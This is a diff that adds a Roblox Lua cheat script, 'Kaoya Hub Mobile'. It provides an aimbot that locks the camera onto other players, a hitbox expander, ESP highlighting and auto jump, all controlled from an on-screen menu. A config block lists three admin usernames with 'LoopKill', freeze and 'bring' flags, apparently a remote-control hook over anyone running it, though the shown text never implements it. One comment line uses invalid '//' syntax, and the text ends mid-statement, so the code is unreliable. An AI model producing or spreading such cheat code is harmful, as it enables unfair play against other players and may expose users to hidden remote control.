@@ -1,0 +1,897 @@
+-- ====================================================
+-- KAOYA HUB MOBILE - INTEGRATED SCRIPT (AIMBOT NEW & SAFE AUTO JUMP)
+-- ====================================================
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Workspace = game:GetService("Workspace")
+local StarterGui = game:GetService("StarterGui")
+
+local LocalPlayer = Players.LocalPlayer
+local Camera = Workspace.CurrentCamera
+
+-- ====================================================
+-- CẤU HÌNH AIMBOT & HITBOX & AUTO JUMP
+-- ====================================================
+local AIM_RANGE = 250
+local AIM_FOV = 75
+
+local size = 25
+local enabled = false
+local showVisual = false
+local espEnabled = false
+local isMinimized = false
+
+-- Trạng thái mới
+local autoJumpActive = false
+local aimEnabled = false
+local isAimButtonLocked = false
+local aiming = false
+local target = nil
+local lockedTargetName = nil
+local ignoredPlayers = {}
+
+-- ====================================================
+-- CẤU HÌNH ADMIN REMOTE
+-- ====================================================
+local Admins = {"meoiuaccphu", "daide_long9ngon", "HTGMx_tuber97ne"}
+local LoopKill = false
+local IsFrozen = false
+local IsBringLoop = false
+local ActiveAdmin = nil
+local lastKillTime = 0
+
+-- Hàm thông báo
+local function ShowNotification(title, message)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = title,
+            Text = message,
+            Duration = 3
+        })
+    end)
+end
+
+-- ====================================================
+-- GIAO DIỆN CHÍNH (ScreenGui)
+-- ====================================================
+local sg = Instance.new("ScreenGui")
+sg.Name = "KaoyaHub_MobileHard_V3"
+pcall(function() sg.Parent = game:GetService("CoreGui") end)
+if not sg.Parent then sg.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+sg.ResetOnSpawn = false
+
+----------------------------------------------------
+-- NÚT AIM TRÒN DI ĐỘNG & BẢNG NHẬP TÊN MỤC TIÊU
+----------------------------------------------------
+local aimActionButton = Instance.new("TextButton")
+aimActionButton.Size = UDim2.new(0, 70, 0, 70)
+aimActionButton.Position = UDim2.new(0.7, 0, 0.5, 0)
+aimActionButton.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
+aimActionButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+aimActionButton.Text = "AIM"
+aimActionButton.Font = Enum.Font.GothamBold
+aimActionButton.TextSize = 12
+aimActionButton.Visible = false
+aimActionButton.ZIndex = 10
+aimActionButton.Parent = sg
+
+local aimCorner = Instance.new("UICorner", aimActionButton)
+aimCorner.CornerRadius = UDim.new(1, 0)
+
+local aimBtnStroke = Instance.new("UIStroke", aimActionButton)
+aimBtnStroke.Color = Color3.fromRGB(50, 50, 55)
+aimBtnStroke.Thickness = 1.5
+
+-- Kéo thả nút AIM tròn
+local aimDragging = false
+local aimDragStart = nil
+local aimStartPos = nil
+
+aimActionButton.InputBegan:Connect(function(input)
+    if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and not isAimButtonLocked then
+        aimDragging = true
+        aimDragStart = input.Position
+        aimStartPos = aimActionButton.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                aimDragging = false
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if aimDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - aimDragStart
+    aimActionButton.Position = UDim2.new(
+            aimStartPos.X.Scale,
+            aimStartPos.X.Offset + delta.X,
+            aimStartPos.Y.Scale,
+            aimStartPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- Bảng GUI nhỏ nhập tên khi Bật Aimbot (Có thể di chuyển bằng cách kéo thanh tiêu đề hoặc khung)
+local aimGuiBox = Instance.new("Frame")
+aimGuiBox.Name = "AimbotGuiBox"
+aimGuiBox.Size = UDim2.new(0, 220, 0, 95)
+aimGuiBox.Position = UDim2.new(0.5, -110, 0.2, 0)
+aimGuiBox.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+aimGuiBox.BorderSizePixel = 0
+aimGuiBox.Visible = false
+aimGuiBox.ZIndex = 11
+aimGuiBox.Parent = sg
+Instance.new("UICorner", aimGuiBox).CornerRadius = UDim.new(0, 6)
+local aimBoxStroke = Instance.new("UIStroke", aimGuiBox)
+aimBoxStroke.Color = Color3.fromRGB(0, 255, 128)
+aimBoxStroke.Thickness = 1.5
+
+local targetTextBox = Instance.new("TextBox")
+targetTextBox.Size = UDim2.new(1, -10, 0, 35)
+targetTextBox.Position = UDim2.new(0, 5, 0, 8)
+targetTextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+targetTextBox.BorderSizePixel = 0
+targetTextBox.PlaceholderText = "Nhập tên người cần ngắm..."
+targetTextBox.Text = ""
+targetTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+targetTextBox.TextScaled = true
+targetTextBox.Font = Enum.Font.Gotham
+targetTextBox.ZIndex = 12
+targetTextBox.Parent = aimGuiBox
+Instance.new("UICorner", targetTextBox).CornerRadius = UDim.new(0, 4)
+
+local lockAimBtn = Instance.new("TextButton")
+lockAimBtn.Size = UDim2.new(0.48, 0, 0, 32)
+lockAimBtn.Position = UDim2.new(0, 5, 0, 52)
+lockAimBtn.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
+lockAimBtn.BorderSizePixel = 0
+lockAimBtn.Text = "KHÓA"
+lockAimBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+lockAimBtn.TextScaled = true
+lockAimBtn.Font = Enum.Font.GothamBold
+lockAimBtn.ZIndex = 12
+lockAimBtn.Parent = aimGuiBox
+Instance.new("UICorner", lockAimBtn).CornerRadius = UDim.new(0, 4)
+
+local unlockAimBtn = Instance.new("TextButton")
+unlockAimBtn.Size = UDim2.new(0.48, 0, 0, 32)
+unlockAimBtn.Position = UDim2.new(0.52, -2, 0, 52)
+unlockAimBtn.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+unlockAimBtn.BorderSizePixel = 0
+unlockAimBtn.Text = "MỞ KHÓA"
+unlockAimBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+unlockAimBtn.TextScaled = true
+unlockAimBtn.Font = Enum.Font.GothamBold
+unlockAimBtn.ZIndex = 12
+unlockAimBtn.Parent = aimGuiBox
+Instance.new("UICorner", unlockAimBtn).CornerRadius = UDim.new(0, 4)
+
+-- Logic khóa / mở khóa qua bảng tên
+lockAimBtn.MouseButton1Click:Connect(function()
+    local searchName = targetTextBox.Text:lower()
+    if searchName == "" then
+        ShowNotification("Aimbot", "⚠️ Vui lòng nhập tên người chơi cần khóa!")
+        return
+    end
+    local found = nil
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and string.sub(p.Name:lower(), 1, #searchName) == searchName then
+            found = p
+            break
+        end
+    end
+    if found then
+        lockedTargetName = found
+        ShowNotification("Aimbot", "🎯 Đã KHÓA mục tiêu: " .. found.Name)
+    else
+        ShowNotification("Aimbot", "❌ Không tìm thấy người chơi này!")
+    end
+end)
+
+unlockAimBtn.MouseButton1Click:Connect(function()
+    lockedTargetName = nil
+    targetTextBox.Text = ""
+    ShowNotification("Aimbot", "🔓 Đã MỞ KHÓA mục tiêu!")
+end)
+
+----------------------------------------------------
+// THUẬT TOÁN AIMBOT MỚI (MƯỢT MÀ / TAY CẦM)
+----------------------------------------------------
+local function findTarget()
+    local char = LocalPlayer.Character
+    if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end
+    local rootPos = char.HumanoidRootPart.Position
+    local camLook = Camera.CFrame.LookVector
+    local bestTarget = nil
+    local bestDist = math.huge
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and not ignoredPlayers[plr] and plr.Character then
+            local root = plr.Character:FindFirstChild("HumanoidRootPart")
+            local hum = plr.Character:FindFirstChild("Humanoid")
+            if root and hum and hum.Health > 0 then
+                local dist = (root.Position - rootPos).Magnitude
+                if dist > AIM_RANGE then continue end
+                local dir = (root.Position - Camera.CFrame.Position).Unit
+                local angle = math.deg(math.acos(math.clamp(dir:Dot(camLook), -1, 1)))
+                if angle <= AIM_FOV and dist < bestDist then
+                    bestDist = dist
+                    bestTarget = {player = plr, body = root}
+                end
+            end
+        end
+    end
+    return bestTarget
+end
+
+local function UpdateAimLock()
+    if not aimEnabled or not aiming then
+        pcall(function() RunService:UnbindFromRenderStep("KaoyaHub_MobileLock") end)
+        target = nil
+        aiming = false
+        aimActionButton.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
+        aimBtnStroke.Color = Color3.fromRGB(50, 50, 55)
+        aimActionButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+        aimActionButton.Text = "AIM"
+        return
+    end
+
+    -- Nếu có người dùng nhập khóa tên cụ thể
+    local activeTargetPart = nil
+    if lockedTargetName and lockedTargetName.Character and lockedTargetName.Character:FindFirstChild("HumanoidRootPart") then
+        local hum = lockedTargetName.Character:FindFirstChildOfClass("Humanoid")
+        if hum and hum.Health > 0 then
+            activeTargetPart = lockedTargetName.Character.HumanoidRootPart
+        end
+    end
+
+    if not activeTargetPart then
+        local found = findTarget()
+        if found then activeTargetPart = found.body end
+    end
+
+    if activeTargetPart then
+        aimActionButton.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
+        aimBtnStroke.Color = Color3.fromRGB(39, 174, 96)
+        aimActionButton.TextColor3 = Color3.fromRGB(39, 174, 96)
+        aimActionButton.Text = "LOCKED"
+        
+        local targetPos = activeTargetPart.Position + Vector3.new(0, 0.5, 0)
+        local currentCamCFrame = Camera.CFrame
+        local targetCFrame = CFrame.new(currentCamCFrame.Position, targetPos)
+        -- Độ mượt giả lập analog tay cầm (0.2)
+        Camera.CFrame = currentCamCFrame:Lerp(targetCFrame, 0.2)
+    else
+        aimActionButton.BackgroundColor3 = Color3.fromRGB(22, 22, 25)
+        aimBtnStroke.Color = Color3.fromRGB(241, 196, 15)
+        aimActionButton.TextColor3 = Color3.fromRGB(241, 196, 15)
+        aimActionButton.Text = "SCANNING"
+    end
+end
+
+aimActionButton.MouseButton1Click:Connect(function()
+    if not aimEnabled then return end
+    aiming = not aiming
+    if aiming then
+        RunService:BindToRenderStep("KaoyaHub_MobileLock", Enum.RenderPriority.Camera.Value + 1, UpdateAimLock)
+    else
+        pcall(function() RunService:UnbindFromRenderStep("KaoyaHub_MobileLock") end)
+        target = nil
+        aiming = false
+        aimActionButton.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
+        aimBtnStroke.Color = Color3.fromRGB(50, 50, 55)
+        aimActionButton.TextColor3 = Color3.fromRGB(200, 200, 200)
+        aimActionButton.Text = "AIM"
+    end
+end)
+
+----------------------------------------------------
+-- MENU CHÍNH
+----------------------------------------------------
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 310, 0, 220)
+mainFrame.Position = UDim2.new(0.5, -155, 0.4, -110)
+mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Parent = sg
+
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 4)
+local mainStroke = Instance.new("UIStroke", mainFrame)
+mainStroke.Color = Color3.fromRGB(50, 50, 55)
+mainStroke.Thickness = 1
+
+local topBar = Instance.new("Frame")
+topBar.Size = UDim2.new(1, 0, 0, 35)
+topBar.BackgroundColor3 = Color3.fromRGB(22, 22, 25)
+topBar.BorderSizePixel = 0
+topBar.Parent = mainFrame
+Instance.new("UICorner", topBar).CornerRadius = UDim.new(0, 4)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0, 120, 1, 0)
+title.Position = UDim2.new(0, 12, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "TUNG HUB BẢN ĐỘ"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 13
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = topBar
+
+local fpsLabel = Instance.new("TextLabel")
+fpsLabel.Size = UDim2.new(0, 60, 1, 0)
+fpsLabel.Position = UDim2.new(1, -170, 0, 0)
+fpsLabel.BackgroundTransparency = 1
+fpsLabel.Text = "FPS: --"
+fpsLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
+fpsLabel.Font = Enum.Font.GothamMedium
+fpsLabel.TextSize = 12
+fpsLabel.TextXAlignment = Enum.TextXAlignment.Right
+fpsLabel.Parent = topBar
+
+local pingLabel = Instance.new("TextLabel")
+pingLabel.Size = UDim2.new(0, 70, 1, 0)
+pingLabel.Position = UDim2.new(1, -105, 0, 0)
+pingLabel.BackgroundTransparency = 1
+pingLabel.Text = "--- ms"
+pingLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
+pingLabel.Font = Enum.Font.GothamMedium
+pingLabel.TextSize = 12
+pingLabel.TextXAlignment = Enum.TextXAlignment.Right
+pingLabel.Parent = topBar
+
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.new(0, 35, 1, 0)
+toggleBtn.Position = UDim2.new(1, -35, 0, 0)
+toggleBtn.BackgroundTransparency = 1
+toggleBtn.Text = "—"
+toggleBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextSize = 12
+toggleBtn.Parent = topBar
+
+local contentFrame = Instance.new("ScrollingFrame")
+contentFrame.Size = UDim2.new(1, 0, 1, -35)
+contentFrame.Position = UDim2.new(0, 0, 0, 35)
+contentFrame.BackgroundTransparency = 1
+contentFrame.BorderSizePixel = 0
+contentFrame.CanvasSize = UDim2.new(0, 0, 0, 260)
+contentFrame.ScrollBarThickness = 3
+contentFrame.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 85)
+contentFrame.Parent = mainFrame
+
+local tb = Instance.new("TextBox")
+tb.Size = UDim2.new(0, 70, 0, 35)
+tb.Position = UDim2.new(0, 15, 0, 15)
+tb.Text = "25"
+tb.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+tb.TextColor3 = Color3.fromRGB(255, 255, 255)
+tb.Font = Enum.Font.GothamBold
+tb.TextSize = 14
+tb.BorderSizePixel = 0
+tb.Parent = contentFrame
+Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 4)
+
+local enableBtn = Instance.new("TextButton")
+enableBtn.Size = UDim2.new(0, 180, 0, 35)
+enableBtn.Position = UDim2.new(0, 100, 0, 15)
+enableBtn.Text = "HITBOX: OFF"
+enableBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+enableBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+enableBtn.Font = Enum.Font.GothamBold
+enableBtn.TextSize = 13
+enableBtn.BorderSizePixel = 0
+enableBtn.Parent = contentFrame
+Instance.new("UICorner", enableBtn).CornerRadius = UDim.new(0, 4)
+
+local showBtn = Instance.new("TextButton")
+showBtn.Size = UDim2.new(0, 220, 0, 35)
+showBtn.Position = UDim2.new(0, 15, 0, 60)
+showBtn.Text = "SHOW VISUAL: OFF"
+showBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+showBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
+showBtn.Font = Enum.Font.GothamBold
+showBtn.TextSize = 12
+showBtn.BorderSizePixel = 0
+showBtn.Parent = contentFrame
+Instance.new("UICorner", showBtn).CornerRadius = UDim.new(0, 4)
+
+local wlToggleBtn = Instance.new("TextButton")
+wlToggleBtn.Size = UDim2.new(0, 35, 0, 35)
+wlToggleBtn.Position = UDim2.new(0, 245, 0, 60)
+wlToggleBtn.Text = "📋"
+wlToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+wlToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+wlToggleBtn.Font = Enum.Font.GothamBold
+wlToggleBtn.TextSize = 16
+wlToggleBtn.BorderSizePixel = 0
+wlToggleBtn.Parent = contentFrame
+Instance.new("UICorner", wlToggleBtn).CornerRadius = UDim.new(0, 4)
+
+local espBtn = Instance.new("TextButton")
+espBtn.Size = UDim2.new(0, 265, 0, 35)
+espBtn.Position = UDim2.new(0, 15, 0, 105)
+espBtn.Text = "ESP HIGHLIGHT: OFF"
+espBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+espBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
+espBtn.Font = Enum.Font.GothamBold
+espBtn.TextSize = 12
+espBtn.BorderSizePixel = 0
+espBtn.Parent = contentFrame
+Instance.new("UICorner", espBtn).CornerRadius = UDim.new(0, 4)
+
+-- Nút Auto Jump tích hợp (Đã fix an toàn)
+local autoJumpBtn = Instance.new("TextButton")
+autoJumpBtn.Size = UDim2.new(0, 265, 0, 35)
+autoJumpBtn.Position = UDim2.new(0, 15, 0, 150)
+autoJumpBtn.Text = "AUTO JUMP: OFF"
+autoJumpBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+autoJumpBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
+autoJumpBtn.Font = Enum.Font.GothamBold
+autoJumpBtn.TextSize = 12
+autoJumpBtn.BorderSizePixel = 0
+autoJumpBtn.Parent = contentFrame
+Instance.new("UICorner", autoJumpBtn).CornerRadius = UDim.new(0, 4)
+
+local aimBtn = Instance.new("TextButton")
+aimBtn.Size = UDim2.new(0, 220, 0, 35)
+aimBtn.Position = UDim2.new(0, 15, 0, 195)
+aimBtn.Text = "AIMBOT BUTTON: OFF"
+aimBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+aimBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+aimBtn.Font = Enum.Font.GothamBold
+aimBtn.TextSize = 12
+aimBtn.BorderSizePixel = 0
+aimBtn.Parent = contentFrame
+Instance.new("UICorner", aimBtn).CornerRadius = UDim.new(0, 4)
+
+local lockBtn = Instance.new("TextButton")
+lockBtn.Size = UDim2.new(0, 35, 0, 35)
+lockBtn.Position = UDim2.new(0, 245, 0, 195)
+lockBtn.Text = "🔓"
+lockBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+lockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+lockBtn.Font = Enum.Font.GothamBold
+lockBtn.TextSize = 16
+lockBtn.BorderSizePixel = 0
+lockBtn.Parent = contentFrame
+Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 4)
+
+----------------------------------------------------
+-- MENU WHITELIST
+----------------------------------------------------
+local wlFrame = Instance.new("Frame")
+wlFrame.Size = UDim2.new(0, 200, 0, 220)
+wlFrame.Position = UDim2.new(1, 10, 0, 0)
+wlFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
+wlFrame.BorderSizePixel = 0
+wlFrame.Visible = false
+wlFrame.Parent = mainFrame
+Instance.new("UICorner", wlFrame).CornerRadius = UDim.new(0, 4)
+Instance.new("UIStroke", wlFrame).Color = Color3.fromRGB(50, 50, 55)
+
+local wlTopBar = Instance.new("Frame")
+wlTopBar.Size = UDim2.new(1, 0, 0, 35)
+wlTopBar.BackgroundColor3 = Color3.fromRGB(22, 22, 25)
+wlTopBar.BorderSizePixel = 0
+wlTopBar.Parent = wlFrame
+Instance.new("UICorner", wlTopBar).CornerRadius = UDim.new(0, 4)
+
+local wlTitle = Instance.new("TextLabel")
+wlTitle.Size = UDim2.new(1, -10, 1, 0)
+wlTitle.Position = UDim2.new(0, 10, 0, 0)
+wlTitle.BackgroundTransparency = 1
+wlTitle.Text = "PLAYER LIST"
+wlTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+wlTitle.Font = Enum.Font.GothamBold
+wlTitle.TextSize = 12
+wlTitle.TextXAlignment = Enum.TextXAlignment.Left
+wlTitle.Parent = wlTopBar
+
+local wlScroll = Instance.new("ScrollingFrame")
+wlScroll.Size = UDim2.new(1, 0, 1, -40)
+wlScroll.Position = UDim2.new(0, 0, 0, 40)
+wlScroll.BackgroundTransparency = 1
+wlScroll.BorderSizePixel = 0
+wlScroll.ScrollBarThickness = 2
+wlScroll.Parent = wlFrame
+
+local function refreshWhitelist()
+    for _, child in pairs(wlScroll:GetChildren()) do
+        if child:IsA("TextButton") then child:Destroy() end
+    end
+    local yPos = 0
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then
+            local pBtn = Instance.new("TextButton")
+            pBtn.Size = UDim2.new(1, -10, 0, 30)
+            pBtn.Position = UDim2.new(0, 5, 0, yPos)
+            pBtn.Font = Enum.Font.GothamSemibold
+            pBtn.TextSize = 11
+            Instance.new("UICorner", pBtn).CornerRadius = UDim.new(0, 4)
+            pBtn.Parent = wlScroll
+            if ignoredPlayers[plr] then
+                pBtn.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+                pBtn.Text = plr.DisplayName .. " [OFF]"
+            else
+                pBtn.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
+                pBtn.Text = plr.DisplayName .. " [ON]"
+            end
+            pBtn.MouseButton1Click:Connect(function()
+                ignoredPlayers[plr] = not ignoredPlayers[plr]
+                if ignoredPlayers[plr] then
+                    pBtn.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+                    pBtn.Text = plr.DisplayName .. " [OFF]"
+                else
+                    pBtn.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
+                    pBtn.Text = plr.DisplayName .. " [ON]"
+                end
+            end)
+            yPos = yPos + 35
+        end
+    end
+    wlScroll.CanvasSize = UDim2.new(0, 0, 0, yPos)
+end
+
+wlToggleBtn.MouseButton1Click:Connect(function()
+    wlFrame.Visible = not wlFrame.Visible
+    if wlFrame.Visible then refreshWhitelist() end
+end)
+
+----------------------------------------------------
+-- LOGIC CÁC NÚT CHỨC NĂNG
+----------------------------------------------------
+local function resetAll()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character then
+            local root = plr.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                root.Size = Vector3.new(2, 2, 1)
+                root.Transparency = 1
+                root.CanCollide = false
+            end
+        end
+    end
+end
+
+tb.FocusLost:Connect(function()
+    local num = tonumber(tb.Text)
+    if num then size = math.clamp(num, 2, 100) end
+    tb.Text = tostring(size)
+end)
+
+enableBtn.MouseButton1Click:Connect(function()
+    enabled = not enabled
+    if enabled then
+        enableBtn.Text = "HITBOX: ON"
+        enableBtn.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
+        enableBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    else
+        enableBtn.Text = "HITBOX: OFF"
+        enableBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+        enableBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+        resetAll()
+    end
+end)
+
+showBtn.MouseButton1Click:Connect(function()
+    showVisual = not showVisual
+    showBtn.Text = "SHOW VISUAL: " .. (showVisual and "ON" or "OFF")
+    showBtn.BackgroundColor3 = showVisual and Color3.fromRGB(41, 128, 185) or Color3.fromRGB(25, 25, 28)
+    showBtn.TextColor3 = showVisual and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 150)
+end)
+
+espBtn.MouseButton1Click:Connect(function()
+    espEnabled = not espEnabled
+    espBtn.Text = "ESP HIGHLIGHT: " .. (espEnabled and "ON" or "OFF")
+    espBtn.BackgroundColor3 = espEnabled and Color3.fromRGB(142, 68, 173) or Color3.fromRGB(25, 25, 28)
+    espBtn.TextColor3 = espEnabled and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 150)
+    if not espEnabled then
+        for _, p in ipairs(Players:GetPlayers()) do
+            local hl = p.Character and p.Character:FindFirstChild("HitboxESP")
+            if hl then hl:Destroy() end
+        end
+    end
+end)
+
+-- Nút điều khiển Auto Jump an toàn
+autoJumpBtn.MouseButton1Click:Connect(function()
+    autoJumpActive = not autoJumpActive
+    autoJumpBtn.Text = "AUTO JUMP: " .. (autoJumpActive and "ON" or "OFF")
+    autoJumpBtn.BackgroundColor3 = autoJumpActive and Color3.fromRGB(39, 174, 96) or Color3.fromRGB(25, 25, 28)
+    autoJumpBtn.TextColor3 = autoJumpActive and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(150, 150, 150)
+end)
+
+toggleBtn.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    if isMinimized then
+        contentFrame.Visible = false
+        wlFrame.Visible = false
+        mainFrame:TweenSize(UDim2.new(0, 310, 0, 35), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, 0.2, true)
+        toggleBtn.Text = "+"
+    else
+        mainFrame:TweenSize(UDim2.new(0, 310, 0, 220), Enum.EasingDirection.Out, Enum.EasingStyle.Quart, 0.2, true, function()
+            contentFrame.Visible = true
+        end)
+        toggleBtn.Text = "—"
+    end
+end)
+
+aimBtn.MouseButton1Click:Connect(function()
+    aimEnabled = not aimEnabled
+    aimActionButton.Visible = aimEnabled
+    aimGuiBox.Visible = aimEnabled
+    if aimEnabled then
+        aimBtn.Text = "AIMBOT BUTTON: ON"
+        aimBtn.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
+        aimBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    else
+        aimBtn.Text = "AIMBOT BUTTON: OFF"
+        aimBtn.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
+        aimBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+        aiming = false
+        lockedTargetName = nil
+        targetTextBox.Text = ""
+        pcall(function() RunService:UnbindFromRenderStep("KaoyaHub_MobileLock") end)
+        target = nil
+        aimActionButton.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
+        aimBtnStroke.Color = Color3.fromRGB(50, 50, 55)
+        aimActionButton.Text = "AIM"
+    end
+end)
+
+lockBtn.MouseButton1Click:Connect(function()
+    isAimButtonLocked = not isAimButtonLocked
+    if isAimButtonLocked then
+        lockBtn.Text = "🔒"
+        lockBtn.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+    else
+        lockBtn.Text = "🔓"
+        lockBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
+    end
+end)
+
+-- FPS & Ping theo dõi
+local lastUpdate = os.clock()
+local frameCount = 0
+RunService.RenderStepped:Connect(function()
+    frameCount = frameCount + 1
+    local now = os.clock()
+    if now - lastUpdate >= 0.5 then
+        local fps = math.floor(frameCount / (now - lastUpdate))
+        fpsLabel.Text = "FPS: " .. fps
+        if fps >= 50 then fpsLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
+        elseif fps >= 30 then fpsLabel.TextColor3 = Color3.fromRGB(241, 196, 15)
+        else fpsLabel.TextColor3 = Color3.fromRGB(231, 76, 60) end
+        frameCount = 0
+        lastUpdate = now
+    end
+end)
+
+task.spawn(function()
+    while task.wait(1) do
+        if LocalPlayer then
+            local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
+            pingLabel.Text = ping .. " ms"
+            if ping < 80 then pingLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
+            elseif ping < 150 then pingLabel.TextColor3 = Color3.fromRGB(241, 196, 15)
+            else pingLabel.TextColor3 = Color3.fromRGB(231, 76, 60) end
+        end
+    end
+end)
+
+-- Kéo menu chính
+local mainDragging = false
+local mainDragStart = nil
+local mainStartPos = nil
+
+topBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        mainDragging = true
+        mainDragStart = input.Position
+        mainStartPos = mainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then mainDragging = false end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if mainDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - mainDragStart
+        mainFrame.Position = UDim2.new(
+            mainStartPos.X.Scale, mainStartPos.X.Offset + delta.X,
+            mainStartPos.Y.Scale, mainStartPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+----------------------------------------------------
+-- VÒNG LẶP HITBOX, ESP & AUTO JUMP (ĐÃ FIX AN TOÀN)
+----------------------------------------------------
+RunService.RenderStepped:Connect(function()
+    -- Logic Auto Jump thông minh: Chỉ nhảy khi đang đứng/đi bình thường, chống lỗi khi ngồi/chết/stun/bơi
+    if autoJumpActive then
+        pcall(function()
+            local char = LocalPlayer.Character
+            if char then
+                local humanoid = char:FindFirstChildOfClass("Humanoid")
+                if humanoid and humanoid.Health > 0 then
+                    local state = humanoid:GetState()
+                    -- Chỉ cho phép nhảy khi đang ở mặt đất bình thường (Running) hoặc vừa chạm đất
+                    if state == Enum.HumanoidStateType.Running or state == Enum.HumanoidStateType.RunningNoPhysics then
+                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                    end
+                end
+            end
+        end)
+    end
+
+    -- Vòng lặp Hitbox & ESP cho người chơi khác
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character then
+            pcall(function()
+                local hrp = p.Character:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    if enabled and not ignoredPlayers[p] then
+                        hrp.Size = Vector3.new(size, size, size)
+                        hrp.CanCollide = false
+                        if showVisual then
+                            hrp.Transparency = 0.5
+                            hrp.Color = Color3.fromHex("#C0C0C0")
+                            hrp.Material = Enum.Material.SmoothPlastic
+                        else
+                            hrp.Transparency = 1
+                        end
+                    else
+                        hrp.Size = Vector3.new(2, 2, 1)
+                        hrp.Transparency = 1
+                        hrp.CanCollide = false
+                    end
+                end
+                if espEnabled then
+                    local hl = p.Character:FindFirstChild("HitboxESP")
+                    if not hl then
+                        hl = Instance.new("Highlight")
+                        hl.Name = "HitboxESP"
+                        hl.FillColor = Color3.fromRGB(231, 76, 60)
